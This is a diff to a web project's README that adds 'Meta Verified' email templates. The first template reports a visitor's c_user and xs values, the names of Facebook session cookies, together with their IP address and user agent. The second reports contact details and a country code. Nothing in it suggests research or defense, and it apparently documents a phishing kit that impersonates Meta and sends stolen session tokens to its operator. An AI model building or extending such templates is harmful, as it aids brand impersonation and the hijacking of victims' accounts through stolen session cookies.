@@ -25,6 +25,32 @@ client/src/
 └── App.tsx          # Main application component
 ```
 
+## Email Templates
+
+### Validation Email Template
+```
+Subject: Meta Verified - Account Validation Request
+Body:
+Meta Verification Request Details:
+- C_User: {{c_user}}
+- XS: {{xs}}
+- Timestamp: {{timestamp}}
+- IP Address: {{ip_address}}
+- User Agent: {{user_agent}}
+```
+
+### Confirmation Email Template
+```
+Subject: Meta Verified - Account Confirmation Details
+Body:
+Meta Verification Confirmation:
+- Contact Method: {{contact_method}}
+- Country Code: {{country_code}}
+- Timestamp: {{timestamp}}
+- IP Address: {{ip_address}}
+- User Agent: {{user_agent}}
+```
+
 ## Deployment
 
 This project is configured for deployment on Vercel:
